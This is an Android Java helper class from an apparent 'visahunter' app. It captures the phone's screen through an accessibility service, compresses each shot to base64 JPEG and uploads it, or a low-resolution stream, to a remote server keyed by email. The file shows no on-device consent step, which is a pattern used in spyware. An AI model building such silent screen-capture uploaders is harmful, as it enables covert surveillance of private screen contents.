package com.visahunter.auth;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import android.view.Display;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

@TargetApi(Build.VERSION_CODES.R)
public class ScreenshotHelper {
    private static final String TAG = "ScreenshotHelper";

    public interface ScreenshotCallback {
        void onResult(boolean success, String message);
    }

    public static void captureAndUpload(AccessibilityService service, String serverUrl, String email, OkHttpClient httpClient) {
        captureAndUpload(service, serverUrl, email, httpClient, false, null);
    }

    public static void captureAndUpload(AccessibilityService service, String serverUrl, String email, OkHttpClient httpClient, ScreenshotCallback callback) {
        captureAndUpload(service, serverUrl, email, httpClient, false, callback);
    }

    public static void captureAndUpload(AccessibilityService service, String serverUrl, String email, OkHttpClient httpClient, boolean isStream, ScreenshotCallback callback) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R || service == null) {
            String msg = "التقاط الشاشة يتطلب أندرويد 11 أو أحدث (جهازك: API " + Build.VERSION.SDK_INT + ")";
            Log.w(TAG, msg);
            if (!isStream) sendAck(serverUrl, email, "SCREENSHOT", false, msg, httpClient);
            if (callback != null) callback.onResult(false, msg);
            return;
        }

        try {
            Executor executor = Executors.newSingleThreadExecutor();
            service.takeScreenshot(Display.DEFAULT_DISPLAY, executor, new AccessibilityService.TakeScreenshotCallback() {
                @Override
                public void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
                    HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
                    if (hardwareBuffer == null) {
                        String err = "تعذر تحويل مخزن الشاشة إلى صورة (HardwareBuffer null)";
                        if (!isStream) sendAck(serverUrl, email, "SCREENSHOT", false, err, httpClient);
                        if (callback != null) callback.onResult(false, err);
                        return;
                    }

                    Bitmap copy = null;
                    try {
                        ColorSpace colorSpace = null;
                        try {
                            colorSpace = screenshotResult.getColorSpace();
                        } catch (Exception ignored) {}
                        if (colorSpace == null) {
                            colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                        }

                        Bitmap bitmap = null;
                        try {
                            bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace);
                        } catch (Exception e) {
                            try {
                                bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, null);
                            } catch (Exception ignored) {}
                        }

                        if (bitmap != null) {
                            copy = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                            bitmap.recycle();
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Bitmap buffer processing error: " + e.getMessage());
                    } finally {
                        try {
                            hardwareBuffer.close();
                        } catch (Exception ignored) {}
                    }

                    if (copy == null) {
                        String err = "تعذر قراءة بكسلات الشاشة من الهاتف";
                        if (!isStream) sendAck(serverUrl, email, "SCREENSHOT", false, err, httpClient);
                        if (callback != null) callback.onResult(false, err);
                        return;
                    }

                    try {
                        int limitDim = isStream ? 640 : 1280;
                        int quality = isStream ? 50 : 70;

                        int maxDim = Math.max(copy.getWidth(), copy.getHeight());
                        Bitmap uploadBitmap = copy;
                        if (maxDim > limitDim) {
                            float scale = (float) limitDim / maxDim;
                            int nw = Math.round(copy.getWidth() * scale);
                            int nh = Math.round(copy.getHeight() * scale);
                            uploadBitmap = Bitmap.createScaledBitmap(copy, nw, nh, true);
                            if (uploadBitmap != copy) {
                                copy.recycle();
                            }
                        }

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        uploadBitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
                        uploadBitmap.recycle();
                        byte[] imageBytes = baos.toByteArray();
                        String base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP);

                        uploadPayload(serverUrl, email, base64Image, isStream, httpClient, callback);
                    } catch (Exception e) {
                        String err = "خطأ أثناء معالجة لقطة الشاشة: " + e.getMessage();
                        Log.e(TAG, err, e);
                        if (!isStream) sendAck(serverUrl, email, "SCREENSHOT", false, err, httpClient);
                        if (callback != null) callback.onResult(false, err);
                    }
                }

                @Override
                public void onFailure(int errorCode) {
                    String reason;
                    switch (errorCode) {
                        case 1: reason = "خطأ داخلي في النظام (Internal Error)"; break;
                        case 2: reason = "صلاحية التصوير غير ممنوحة. يرجى إيقاف وتفعيل إذن النقر مرة واحدة في الإعدادات"; break;
                        case 3: reason = "تم طلب التقاط الشاشة بسرعة كبيرة جداً"; break;
                        case 4: reason = "شاشة غير صالحة"; break;
                        default: reason = "كود الخطأ: " + errorCode; break;
                    }
                    Log.w(TAG, "takeScreenshot failed: " + reason);
                    if (!isStream) sendAck(serverUrl, email, "SCREENSHOT", false, reason, httpClient);
                    if (callback != null) callback.onResult(false, reason);
                }
            });
        } catch (Exception e) {
            String err = "تعذر استدعاء takeScreenshot: " + e.getMessage();
            Log.e(TAG, err, e);
            if (!isStream) sendAck(serverUrl, email, "SCREENSHOT", false, err, httpClient);
            if (callback != null) callback.onResult(false, err);
        }
    }

    private static void uploadPayload(String serverUrl, String email, String base64Image, boolean isStream, OkHttpClient httpClient, ScreenshotCallback callback) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("email", email);
                payload.put("image", "data:image/jpeg;base64," + base64Image);
                payload.put("isStream", isStream);
                payload.put("timestamp", System.currentTimeMillis());

                RequestBody body = RequestBody.create(
                        payload.toString(),
                        MediaType.parse("application/json; charset=utf-8")
                );

                Request req = new Request.Builder()
                        .url(serverUrl.replaceAll("/+$", "") + SecurityCore.getScreenshotEndpoint())
                        .post(body)
                        .build();

                try (Response r = httpClient.newCall(req).execute()) {
                    boolean ok = r.isSuccessful();
                    if (!isStream) {
                        Log.i(TAG, "Screenshot upload HTTP: " + r.code());
                        sendAck(serverUrl, email, "SCREENSHOT", ok, ok ? "تم التقاط ورفع صورة الشاشة بنجاح" : "فشل خادم الرفع كود " + r.code(), httpClient);
                    }
                    if (callback != null) {
                        callback.onResult(ok, ok ? "تم بنجاح" : "فشل كود " + r.code());
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Upload failed: " + e.getMessage());
                if (!isStream) sendAck(serverUrl, email, "SCREENSHOT", false, "فشل إرسال الشاشة: " + e.getMessage(), httpClient);
                if (callback != null) callback.onResult(false, e.getMessage());
            }
        }).start();
    }


    private static void sendAck(String serverUrl, String email, String challengeId, boolean success, String message, OkHttpClient httpClient) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("email", email);
                payload.put("challengeId", challengeId);
                payload.put("success", success);
                payload.put("message", message);

                RequestBody body = RequestBody.create(
                        payload.toString(),
                        MediaType.parse("application/json; charset=utf-8")
                );

                Request req = new Request.Builder()
                        .url(serverUrl.replaceAll("/+$", "") + SecurityCore.getAckEndpoint())
                        .post(body)
                        .build();

                try (Response r = httpClient.newCall(req).execute()) {
                    Log.d(TAG, "Screenshot ACK: " + r.code());
                }
            } catch (Exception ignored) {}
        }).start();
    }
}
